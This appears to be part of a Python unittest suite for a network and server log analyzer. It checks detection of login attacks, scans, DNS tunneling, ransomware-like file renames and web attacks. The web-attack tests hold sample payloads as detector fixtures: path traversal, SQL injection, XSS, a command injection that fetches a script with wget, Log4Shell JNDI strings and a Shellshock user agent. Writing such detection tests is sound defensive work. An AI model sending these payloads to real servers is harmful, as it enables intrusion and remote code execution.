            lines.append(f'{_hms(8 * 3600 + i)} sw1 %SYS-6-LOGGINGHOST_STARTSTOP: Logging started')
            if i < 3600:
                lines.append(f'{_hms(8 * 3600 + i)} sw2 %SYS-6-LOGGINGHOST_STARTSTOP: Logging started')
        lines += [f'date=2020-05-01 time=08:{i:02d}:00 devname="FGT9" logid="0000000013" '
                  f'type="traffic" subtype="forward" level="notice" srcip=10.0.0.5 dstip=10.0.0.6 '
                  f'dstport=80 proto=6 action="accept"' for i in range(25)]
        got = self._titles(lines)
        self.assertIn(('Device stopped logging', 'sw2'), got)
        self.assertNotIn(('Device stopped logging', 'sw1'), got)
        self.assertIn(('Device clock / timestamp mismatch', 'FGT9'), got)

    def test_critical_syslog_message(self):
        got = self._titles(['<10>May  1 08:00:00 gw foo: something terrible happened'])
        self.assertTrue(any(t == 'Critical message' for t, _ in got), got)

    def test_quiet_log_has_no_findings(self):
        lines = [_ufw(f'10.0.0.{i}', '1.1.1.1', 53) for i in range(30)]
        self.assertEqual(self._alerts(lines), [])
        text = netlog.format_summary(_report(lines), {}, color=False)
        self.assertIn('No problems detected', text)

class LiveTrackerTest(unittest.TestCase):
    def setUp(self):
        netlog.parse_event.cache_clear()

    def test_login_attack_banner_and_success_warning(self):
        corr = netlog.LiveCorrelator({}, [0], rules=netlog.Rules(), color=False)
        out  = [corr.process(_login(i * 5)) for i in range(5)]
        self.assertFalse(out[3][0])
        self.assertIn('LOGIN ATTACK', out[4][0][0])
        _before, _gutter, suffix = corr.process(_login(40, ok=True))
        self.assertIn('login succeeded after 5 failures', suffix)

    def test_interface_flapping_banner(self):
        corr = netlog.LiveCorrelator({}, [0], rules=netlog.Rules(), color=False)
        banners = []
        for i in range(3):
            banners += corr.process(_cisco_link(i * 20, 'down'))[0]
            banners += corr.process(_cisco_link(i * 20 + 10, 'up'))[0]
        self.assertTrue(any('INTERFACE FLAPPING' in b for b in banners), banners)



class LineFilterTest(unittest.TestCase):
    LINES = ['deny tcp 22', 'DROP udp 53', 'accept tcp 443', 'kernel: foo']

    def _keep(self, spec):
        f = netlog.make_line_filter(spec)
        return [l for l in self.LINES if f(l)]

    def test_plain_is_case_insensitive(self):
        self.assertEqual(self._keep('drop'), ['DROP udp 53'])

    def test_alternatives(self):
        self.assertEqual(self._keep('deny|drop'), ['deny tcp 22', 'DROP udp 53'])
        self.assertEqual(self._keep('deny | drop'), ['deny tcp 22', 'DROP udp 53'])

    def test_exclude(self):
        self.assertEqual(self._keep('!kernel'), self.LINES[:3])
        self.assertEqual(self._keep('!deny|drop'), ['accept tcp 443', 'kernel: foo'])

    def test_regex(self):
        self.assertEqual(self._keep(r'r:^\w+ tcp'), ['deny tcp 22', 'accept tcp 443'])
        self.assertEqual(self._keep(r'!r:tcp'), ['DROP udp 53', 'kernel: foo'])

    def test_bad_specs_raise(self):
        with self.assertRaises(netlog.re.error):
            netlog.make_line_filter('r:(')
        with self.assertRaises(ValueError):
            netlog.make_line_filter('|')


class LoadGrepTest(unittest.TestCase):
    def test_make_grep_requires_every_pattern(self):
        self.assertIsNone(netlog.make_grep(None))
        keep = netlog.make_grep(['10.146.', '!dhcp'])
        self.assertTrue(keep('sw1: link up 10.146.2.7'))
        self.assertFalse(keep('dhcpd: DHCPACK 10.146.2.7'))
        self.assertFalse(keep('sw1: link up 10.147.2.7'))
        self.assertEqual(netlog.grep_label(['10.146.', '!dhcp']), '10.146. & !dhcp')

    def test_dot_is_literal_unlike_grep(self):
        keep = netlog.make_grep(['10.146.'])
        self.assertFalse(keep('host 10x146y5'))

    def test_cli(self):
        ns = netlog.parse_cli(['-g', '10.146.', '--grep', 'r:deny|drop', 'x.log'])
        self.assertEqual(ns.grep, ['10.146.', 'r:deny|drop'])
        self.assertTrue(ns.keep('10.146.1.1 deny'))
        self.assertFalse(ns.keep('10.146.1.1 accept'))
        self.assertIsNone(netlog.parse_cli(['x.log']).keep)
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
            netlog.parse_cli(['-g', 'r:(', 'x.log'])

    def test_prefilter_multiple_files(self):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            a, b, c = (Path(d, n) for n in ('a.log', 'b.log', 'c.log'))
            a.write_text('x 10.146.1.1\ny 10.1.1.1\r\n')
            b.write_text('nothing here\n')
            c.write_text('z 10.146.9.9')
            with contextlib.redirect_stderr(io.StringIO()):
                tmp, matched, total = netlog._prefilter(
                    [(a, a), (b, b), (c, c)], netlog.make_grep(['10.146.']), '10.146.')
            try:
                self.assertEqual((matched, total), (2, 4))
                self.assertEqual(tmp.read_text().splitlines(),
                                 [f'──── {a} ────', 'x 10.146.1.1',
                                  f'──── {c} ────', 'z 10.146.9.9'])
            finally:
                tmp.unlink()

    def test_summary_only_counts_matching_lines(self):
        lines = [f'{_hms(9 * 3600 + i)} srv1 sshd[1]: Failed password for root from '
                 f'198.51.100.{i % 2} port 5000 ssh2' for i in range(10)]
        keep = netlog.make_grep(['198.51.100.1 '])
        with contextlib.redirect_stdout(io.StringIO()) as out, \
                unittest.mock.patch.object(netlog, 'iter_log_lines', lambda files: iter(lines)):
            netlog.analysis_mode([Path('x.log')], {}, summary=True, keep=keep,
                                 grep='198.51.100.1 ')
        text = out.getvalue()
        self.assertIn('(grep: 198.51.100.1 )', text)
        self.assertIn('Lines read: 5 ', text)


def _clf(src, path, code=200, t=0, method='GET', ua='Mozilla/5.0', user='-'):
    h, r = divmod(8 * 3600 + t, 3600)
    m, sec = divmod(r, 60)
    return (f'{src} - {user} [01/May/2024:{h:02d}:{m:02d}:{sec:02d} +0000] "{method} {path} HTTP/1.1" '
            f'{code} 512 "-" "{ua}"')


class ServerLogTest(unittest.TestCase):
    """Linux server formats and the findings built from them."""

    @staticmethod
    def _titles(lines, **rules):
        return {(a.title, a.subject): a for a in netlog.collect_alerts(_report(lines, **rules))}

    def test_web_attack_signatures(self):
        cases = {
            ('/index.html', 'Mozilla/5.0'): None,
            ('/search?q=network+logs&page=2', 'Mozilla/5.0'): None,
            ('/blog/2024/03/hello-world', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'): None,
            ('/a?file=../../etc/passwd', ''): 'traversal',
            ('/a?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd', ''): 'traversal',
            ('/item?id=1%20UNION%20SELECT%20pass%20FROM%20users', ''): 'sqli',
            ('/q?x=<script>alert(1)</script>', ''): 'xss',
            ('/ping?host=1.1.1.1;wget http://x/s.sh', ''): 'cmdi',
            ('/', '${jndi:ldap://x/a}'): 'log4shell',
            ('/cgi-bin/status', '() { :; }; /bin/bash -c id'): 'cmdi',
            ('/.env', ''): 'sensitive',
            ('/.git/config', ''): 'sensitive',
            ('/phpmyadmin/index.php', ''): 'probe',
            ('/', 'sqlmap/1.7'): 'scanner',
        }
        for (path, ua), want in cases.items():
            with self.subTest(path=path, ua=ua):
                self.assertEqual(netlog.web_attack(path, ua), want)

    def test_web_findings(self):
        lines  = [_clf(f'10.0.0.{i % 20}', '/', t=i) for i in range(200)]
        lines += [_clf('203.0.113.66', f'/probe{i}.php', 404, t=300 + i) for i in range(35)]
        lines += [_clf('198.51.100.23', '/dl?f=../../../etc/passwd', 200, t=400)]
        lines += [_clf('45.83.64.1', '/', 200, t=401, ua='${jndi:ldap://45.83.64.1/a}')]
        lines += [_clf('10.0.0.1', '/api/report', 502, t=500 + i) for i in range(25)]
        got = self._titles(lines)
        self.assertIn(('Web vulnerability scan', '203.0.113.66'), got)
        self.assertEqual(got[('Web attack may have succeeded', '198.51.100.23')].level, 0)
        self.assertIn(('Log4Shell exploit attempts', '45.83.64.1'), got)
        self.assertNotIn(('Web attack may have succeeded', '45.83.64.1'), got)
        self.assertIn(('Web server errors', '-'), got)
        self.assertNotIn(('Web vulnerability scan', '203.0.113.66'), self._titles(lines, web_scan=50))

    def test_wordpress_brute_force_then_success_is_critical(self):
        lines  = [_clf('185.220.101.4', '/wp-login.php', 200, t=i, method='POST') for i in range(8)]
        lines += [_clf('185.220.101.4', '/wp-login.php', 302, t=20, method='POST')]
        a = self._titles(lines)[('Login succeeded after brute force', '185.220.101.4')]
        self.assertEqual(a.level, 0)

    def test_dns_findings(self):
        q = lambda c, name, typ='A', t=0: (f'{_hms(8 * 3600 + t)} ns1 named[1]: client @0x7f00 {c}#5300 '
                                          f'({name}): query: {name} IN {typ} +E(0) (10.0.0.1)')
        lines  = [q('10.0.0.5', 'www.example.com', t=i) for i in range(50)]
        lines += [q('10.0.3.77', 'a' * 50 + f'{i}.t.evil.example', 'TXT', t=100 + i) for i in range(25)]
        lines += [f"{_hms(8 * 3600 + 200 + i)} ns1 named[1]: client @0x7f00 198.51.100.99#1000 (isc.org): "
                  f"query (cache) 'isc.org/ANY/IN' denied" for i in range(25)]
        lines += [f"{_hms(8 * 3600 + 300)} ns1 named[1]: client @0x7f00 203.0.113.9#4444 (example.com): "
                  f"zone transfer 'example.com/AXFR/IN' denied"]
        got = self._titles(lines)
        self.assertIn(('Possible DNS tunneling', '10.0.3.77'), got)
        self.assertIn(('DNS amplification attempt', '198.51.100.99'), got)
        self.assertIn(('Zone transfer attempt', '203.0.113.9'), got)
        self.assertNotIn(('Possible DNS tunneling', '10.0.0.5'), got)

    def test_dhcp_findings(self):
        d = lambda t, msg: f'{_hms(8 * 3600 + t)} dhcp1 dhcpd[9]: {msg}'
        lines  = [d(i, 'DHCPDISCOVER from de:ad:be:ef:00:01 via eth1') for i in range(25)]
        lines += [d(100 + i, 'DHCPNAK on 192.168.1.20 to aa:bb:cc:11:22:33 via eth1') for i in range(6)]
        lines += [d(200, 'DHCPDECLINE of 10.0.5.44 from aa:bb:cc:00:02:2c via eth1: abandoned')]
        lines += [d(300, 'DHCPDISCOVER from aa:bb:cc:99:99:01 via eth3: network 10.0.9.0/24: no free leases')]
        got = self._titles(lines)
        self.assertIn(('Client not getting a DHCP lease', 'de:ad:be:ef:00:01'), got)
        self.assertIn(('DHCP NAKs', 'aa:bb:cc:11:22:33'), got)
        self.assertIn(('IP address conflict (DHCP decline)', '10.0.5.44'), got)
        self.assertIn(('DHCP pool exhausted', 'dhcp1'), got)

    def test_mail_samba_fail2ban_radius_systemd_findings(self):
        t = lambda i: _hms(8 * 3600 + i)
        lines  = [f'{t(i)} mx1 postfix/smtpd[1]: NOQUEUE: reject: RCPT from unknown[203.0.113.120]: '
                  f'554 5.7.1 <x@y.net>: Relay access denied; from=<a@b.org> to=<x@y.net> proto=ESMTP'
                  for i in range(5)]
        lines += [f'{t(10 + i)} fs1 smbd[1]: Auth: [SMB2,(null)] user [CORP]\\[bob] at [x] with [NTLMv2] '
                  f'status [{"NT_STATUS_ACCOUNT_LOCKED_OUT" if i == 5 else "NT_STATUS_WRONG_PASSWORD"}] '
                  f'workstation [WS9] remote host [ipv4:10.0.4.99:50123] mapped to [CORP]\\[bob].'
                  for i in range(6)]
        lines += [f'{t(100 + i // 4)} fs1 smbd_audit: carol|10.0.2.31|ws31|projects|renameat|ok|'
                  f'f{i}.docx|f{i}.docx.crypt' for i in range(120)]
        lines += [f'2024-05-01 08:0{i}:00,123 fail2ban.actions [7]: NOTICE  [sshd] Ban 193.32.162.7'
                  for i in range(3)]
        lines += ['Fri Mar  1 12:00:00 2024 : Error: Ignoring request to auth address * port 1812 bound '
                  'to server default from unknown client 203.0.113.200 port 4321 proto udp']
        lines += [f"{t(500)} web1 systemd[1]: app.service: Failed with result 'exit-code'."]
        got = self._titles(lines)
        self.assertIn(('Open-relay probing', '203.0.113.120'), got)
        self.assertIn(('Account locked out', 'bob'), got)
        self.assertIn(('Login attack (brute force)', '10.0.4.99'), got)
        self.assertIn(('Mass file changes (possible ransomware)', 'carol'), got)
        self.assertNotIn(('Mass file changes (possible ransomware)', 'carol'),
                         self._titles(lines, mass_change=200))
        self.assertIn(('Repeat offender (fail2ban)', '193.32.162.7'), got)
        self.assertIn(('RADIUS request from unknown client', '203.0.113.200'), got)
        self.assertIn(('Service failed', 'web1 app.service'), got)

    def test_samba_message_takes_time_from_header(self):
        an = netlog.Analyzer(keep_raw=True)
        an.feed('[2024/03/01 12:00:00.123456,  2] ../../source3/auth/auth.c:334(auth_check_ntlm_password)')
        ev = an.feed('  check_ntlm_password:  Authentication for user [alice] -> [alice] FAILED with '
                     'error NT_STATUS_WRONG_PASSWORD, authoritative=1')
        self.assertEqual(ev.kind, 'login_fail')
        self.assertEqual(netlog._fmt_ts(ev.ts), 'Mar 01 12:00:00')

    def test_requests_are_aggregated_not_kept(self):
        rep = _report([_clf('10.0.0.1', '/', t=i) for i in range(10)])
        self.assertEqual(rep.events, [])
        self.assertEqual(rep.svc.web_req, 10)
        self.assertIsNotNone(rep.first_ts)

    def test_summary_has_servers_section(self):
        lines  = [_clf('10.0.0.1', '/', t=i) for i in range(5)]
        lines += ['Mar  1 12:00:00 gw dnsmasq[123]: query[A] example.com from 10.0.0.5',
                  'Mar  1 12:00:01 dhcp1 dhcpd[812]: DHCPACK on 10.0.0.50 to aa:bb:cc:dd:ee:ff via eth1']
        text = netlog.format_summary(_report(lines), {})
        for heading in ('SERVERS & SERVICES', 'Web requests', 'DNS', 'DHCP'):
            self.assertIn(heading, text)
        self.assertNotIn('WIRELESS', text)

    def test_client_timeline_for_dhcp_only_mac(self):
        an = netlog.Analyzer(keep_raw=True, context_macs={'aa:bb:cc:dd:ee:ff'})
        an.feed('Mar  1 12:00:01 dhcp1 dhcpd[812]: DHCPACK on 10.0.0.50 to aa:bb:cc:dd:ee:ff via eth1')
        text, found = netlog.format_timeline(netlog.Report(an), 'aa:bb:cc:dd:ee:ff', {})
        self.assertTrue(found)
        self.assertIn('DHCPACK on 10.0.0.50', text)

    def test_new_text_detectors(self):
        self.assertEqual(netlog.text_issue('type=AVC msg=audit(1.2:3): avc:  denied  { read } for pid=1'),
                         'macdeny')
        self.assertEqual(netlog.text_issue('dnsmasq-dhcp[1]: DHCPDISCOVER(br0) aa:bb:cc:dd:ee:ff no '
                                           'address available'), 'dhcp')


class WrapLayoutTest(unittest.TestCase):
    PREFIX = [('✗ ', 0)]

    def _rows(self, chunks, width, wrap=True, hoff=0, max_rows=None):
        placed, used = netlog._layout(self.PREFIX, chunks, width, wrap, hoff, max_rows)
        rows = [''] * used
        for r, x, t, _a in placed:
            rows[r] = rows[r].ljust(x) + t
        return rows

    def test_short_line_is_one_row(self):
        self.assertEqual(self._rows([('hello world', 0)], 40), ['✗ hello world'])

    def test_wrap_indents_continuation_rows_at_word_boundaries(self):
        rows = self._rows([('alpha beta gamma delta epsilon zeta', 0)], 21)
        self.assertEqual(rows[0].rstrip(), '✗ alpha beta gamma')
        indent = ' ' * (2 + netlog.WRAP_INDENT)
        for r in rows[1:]:
            self.assertTrue(r.startswith(indent) and r[len(indent)] != ' ', r)
        self.assertEqual(' '.join(r.strip(' ✗') for r in rows),
                         'alpha beta gamma delta epsilon zeta')

    def test_long_word_is_split(self):
        rows = self._rows([('x' * 50, 0)], 21)
        self.assertEqual(''.join(r.strip(' ✗') for r in rows), 'x' * 50)
        self.assertTrue(all(len(r) <= 20 for r in rows))

    def test_no_wrap_cuts_and_pans(self):
        self.assertEqual(self._rows([('0123456789abcdefghij', 0)], 11, wrap=False),
                         ['✗ 01234567'])
        self.assertEqual(self._rows([('0123', 0), ('456789abcdefghij', 1)], 11,
                                    wrap=False, hoff=6), ['✗ 6789abcd'])

    def test_max_rows_limits_output(self):
        self.assertEqual(len(self._rows([('word ' * 40, 0)], 21, max_rows=2)), 2)


class FitAnsiTest(unittest.TestCase):
    @staticmethod
    def _plain(s):
        return netlog.re.sub(r'\x1b\[[0-9;]*m', '', s)

    def test_short_lines_untouched(self):
        self.assertEqual(netlog.fit_ansi('\x1b[1;31m✗ \x1b[0mshort', 80), '\x1b[1;31m✗ \x1b[0mshort')

    def test_wrap_with_indent_and_colors(self):
        line = '✗ ' + 'word ' * 6 + '\x1b[0;32m10.0.0.1\x1b[0m end'
        out  = netlog.fit_ansi(line, 24)
        rows = self._plain(out).split('\n')
        self.assertTrue(all(len(r) <= 24 for r in rows), rows)
        self.assertTrue(all(r.startswith(' ' * 6) for r in rows[1:]), rows)
        self.assertIn('10.0.0.1', self._plain(out).replace('\n', ''))

    def test_color_carried_onto_continuation(self):
        out = netlog.fit_ansi('ab \x1b[0;32m' + 'g' * 30 + '\x1b[0m', 24)
        first, second = out.split('\n')
        self.assertTrue(first.endswith('\x1b[0m'))
        self.assertIn('\x1b[0;32m', second)

    def test_no_wrap_cuts(self):
        out = netlog.fit_ansi('✗ ' + 'x' * 100, 30, wrap=False)
        self.assertEqual(len(self._plain(out)), 30)
        self.assertNotIn('\n', out)


class LargeFileViewTest(unittest.TestCase):
    def test_index_view(self):
        v = netlog.LargeFileView(['a', 'b', 'c', 'd'], netlog.array.array('Q', [1, 3]))
        self.assertEqual(len(v), 2)
        self.assertEqual(v[1], ('d', 1))
        self.assertEqual(list(v), [('b', 1), ('d', 1)])
        self.assertEqual(netlog.next_match(v, 'D', False, 0), (1, False))

class AnalysisCliTest(unittest.TestCase):
    def test_analysis_options(self):
        ns = netlog.parse_cli(['--summary', '--client', 'alice', '--loop-window', '5m',
                               '--loop-threshold', '4', 'x.log'])
        self.assertTrue(ns.summary)
        self.assertEqual(ns.client, 'alice')
        self.assertEqual(ns.loop_window, 300)
        self.assertEqual(ns.loop_threshold, 4)
        self.assertEqual(ns.log_files, [Path('x.log')])

    def test_threshold_options(self):
        ns = netlog.parse_cli(['--flap-threshold', '2', '--flap-window', '1h',
                               '--brute-threshold', '10', '--brute-window', '90s',
                               '--scan-ports', '50', '--scan-hosts', '8', '--scan-window', '2m',
                               '--spray-accounts', '9', '--spray-sources', '4',
                               '--spike-min', '50', '--spike-factor', '2.5',
                               '--spike-window', '10m', 'x.log'])
        self.assertEqual((ns.flap_threshold, ns.flap_window), (2, 3600))
        self.assertEqual((ns.brute_threshold, ns.brute_window), (10, 90))
        self.assertEqual((ns.scan_ports, ns.scan_hosts, ns.scan_window), (50, 8, 120))
        self.assertEqual((ns.spray_accounts, ns.spray_sources), (9, 4))
        self.assertEqual((ns.spike_min, ns.spike_factor, ns.spike_window), (50, 2.5, 600))

    def test_threshold_defaults_match_rules(self):
        ns, r = netlog.parse_cli(['x.log']), netlog.Rules()
        for opt in ('flap_threshold', 'flap_window', 'brute_threshold', 'brute_window',
                    'scan_ports', 'scan_hosts', 'scan_window', 'spray_accounts',
                    'spray_sources', 'spike_min', 'spike_factor', 'spike_window', 'web_scan',
                    'mass_change'):
            with self.subTest(opt=opt):
                self.assertEqual(getattr(ns, opt), getattr(r, opt))

    def test_wrap_flags(self):
        self.assertIsNone(netlog.parse_cli(['x.log']).wrap)
        self.assertTrue(netlog.parse_cli(['--wrap', 'x.log']).wrap)
        self.assertFalse(netlog.parse_cli(['--no-wrap', 'x.log']).wrap)
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
            netlog.parse_cli(['--wrap', '--no-wrap', 'x.log'])

    def test_formats_flag(self):
        self.assertTrue(netlog.parse_cli(['--formats']).formats)

    def test_bad_values_rejected(self):
        for argv in (['-f', '--summary', 'x.log'], ['--legacy-ssid', '(', 'x.log'],
                     ['--loop-window', 'soon', 'x.log'], ['--loop-threshold', '0', 'x.log'],
                     ['--flap-threshold', '0', 'x.log'], ['--brute-window', '0', 'x.log'],
                     ['--spray-accounts', '0', 'x.log'], ['--spike-factor', '0.5', 'x.log'],
                     ['--spike-factor', 'nan', 'x.log'], ['--spike-window', '0', 'x.log'],
                     ['--scan-ports', '0', 'x.log'], ['--scan-hosts', '-1', 'x.log']):
            with self.subTest(argv=argv), contextlib.redirect_stderr(io.StringIO()), \
                    self.assertRaises(SystemExit):
                netlog.parse_cli(argv)


class UtcToLocalTest(unittest.TestCase):
    """-U rewrites UTC timestamps into the local zone, keeping each layout."""

    def setUp(self):
        import os, time
        self._tz = os.environ.get('TZ')
        os.environ['TZ'] = 'America/New_York'      # EST -05:00 / EDT -04:00
        time.tzset()
        netlog._LOCALIZE_CACHE.clear()

    def tearDown(self):
        import os, time
        if self._tz is None:
            os.environ.pop('TZ', None)
        else:
            os.environ['TZ'] = self._tz
        time.tzset()
        netlog._LOCALIZE_CACHE.clear()

    def check(self, cases):
        for src, want in cases:
            with self.subTest(src=src):
                self.assertEqual(netlog.utc_to_local(src), want)

    def test_layouts(self):
        self.check([
            ('Mar  1 12:00:00 gw kernel: x',          'Mar  1 07:00:00 gw kernel: x'),
            ('Jul 12 12:00:00 gw x',                  'Jul 12 08:00:00 gw x'),       # EDT
            ('2024-03-01T12:00:00Z gw',               '2024-03-01T07:00:00-05:00 gw'),
            ('2024-03-01T12:00:00.5+02:00',           '2024-03-01T05:00:00.5-05:00'),
            ('2024-03-01 12:00:00,123 fail2ban',      '2024-03-01 07:00:00,123 fail2ban'),
            ('x 2024-03-01 12:00:00.000 +00:00 y',    'x 2024-03-01 07:00:00.000 -05:00 y'),
            ('2024/03/01 12:00:00 [error]',           '2024/03/01 07:00:00 [error]'),
            ('[01/Mar/2024:12:00:00 +0000] "GET',     '[01/Mar/2024:07:00:00 -0500] "GET'),
            ('01-Mar-2024 12:00:00.123 client',       '01-Mar-2024 07:00:00.123 client'),
            ('[Fri, 01 Mar 2024 12:00:00.1 UTC]',     '[Fri, 01 Mar 2024 07:00:00.1 EST]'),
            ('Fri Mar  1 12:00:00 2024 : Error',      'Fri Mar  1 07:00:00 2024 : Error'),
            ('[Fri Mar 01 12:00:00.123456 2024]',     '[Fri Mar 01 07:00:00.123456 2024]'),
            ('%Mar  1 12:00:00:000 2024 SW1',         '%Mar  1 07:00:00:000 2024 SW1'),
            ('*Mar  1 12:00:00.123 UTC: %LINK',       '*Mar  1 07:00:00.123 EST: %LINK'),
            ('date=2024-03-01 time=12:00:00 dev=x',   'date=2024-03-01 time=07:00:00 dev=x'),
            ('time="2024-03-01 12:00:00" fw=1',       'time="2024-03-01 07:00:00" fw=1'),
        ])

    def test_date_rolls_back(self):
        self.check([
            ('2024-01-01T02:00:00Z',            '2023-12-31T21:00:00-05:00'),
            ('Mon Jan  1 02:00:00 2024',        'Sun Dec 31 21:00:00 2023'),
            ('Jan 10 03:00:00 h',               'Jan  9 22:00:00 h'),   # day field width kept
            ('date=2024-03-01 time=02:00:00',   'date=2024-02-29 time=21:00:00'),
        ])

    def test_every_timestamp_in_line(self):
        self.check([('<14>Mar  1 12:00:00 PA-1 1,2024/03/01 12:00:00,0132,TRAFFIC,deny,1,'
                     '2024/03/01 12:00:00,203.0.113.5',
                     '<14>Mar  1 07:00:00 PA-1 1,2024/03/01 07:00:00,0132,TRAFFIC,deny,1,'
                     '2024/03/01 07:00:00,203.0.113.5')])

    def test_left_alone(self):
        for line in ('MAC=00:11:22:33:44:55 SRC=10.0.0.1', 'uptime 12:00:00',
                     '1709294400.123    234 10.0.0.5 TCP_MISS/200', '2024-13-45 12:00:00',
                     'AP[AP-1@11:22:33:44:55:66]', 'no colon here'):
            with self.subTest(line=line):
                self.assertEqual(netlog.utc_to_local(line), line)

    def test_analysis_epoch_unchanged_by_offset_style(self):
        # A Z timestamp rewritten to local still parses to the same instant.
        src = '2024-03-01T12:00:00Z host sshd[1]: x'
        self.assertEqual(netlog.parse_timestamp(netlog.utc_to_local(src)),
                         netlog.parse_timestamp(src))

    def test_every_format_example_still_parses(self):
        for fmt in netlog.FORMATS:
            for line, kind, fields in fmt.examples:
                with self.subTest(fmt=fmt.id, line=line[:40]):
                    p = netlog._parse_event(netlog.utc_to_local(line))
                    self.assertIsNotNone(p)
                    self.assertEqual(p.kind, kind)

    def test_cli_flag(self):
        self.assertIs(netlog.parse_cli(['-U', 'x.log']).xform, netlog.utc_to_local)
        self.assertIsNone(netlog.parse_cli(['x.log']).xform)


if __name__ == '__main__':
    unittest.main()
